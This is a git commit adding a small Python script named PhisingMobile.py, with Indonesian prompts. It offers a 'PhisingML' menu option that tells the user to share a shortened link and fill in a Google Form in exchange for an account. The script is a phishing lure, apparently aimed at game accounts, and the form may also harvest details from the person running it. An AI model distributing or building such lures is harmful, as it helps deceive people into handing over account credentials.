46b87b44b4e6fa91128e2101f8efec388aea8376
Epicwise <69495451+Epicwise@users.noreply.github.com>
2020-09-13 17:48:49 +0700

    PhisingMobile.py
    Kepo

---
+++ PhisingMobile.py
@@ -0,0 +1,15 @@
+import os
+os.system('clear')
+print'Author:Epic Wise'
+print
+print'Youtube:Epic Wise'
+print
+print'Instagram:epic.wise'
+print
+print
+print'1.PhisingML'
+print
+pilih=input('Pilih Menu : ')
+if pilih== 1:
+	print
+	Phising_ML= input('Salin Link ini dan Share   shorturl.at/iwAJY..        Lalu kamu isi di link berikut ini agar saya bisa memberikan akun kepada anda       https://docs.google.com/forms/d/e/1FAIpQLSf_Lh8m-9D6v4TF1ep20XK_8TuJpdLeclD3a6ZI_IqpxtHsHQ/viewform ')
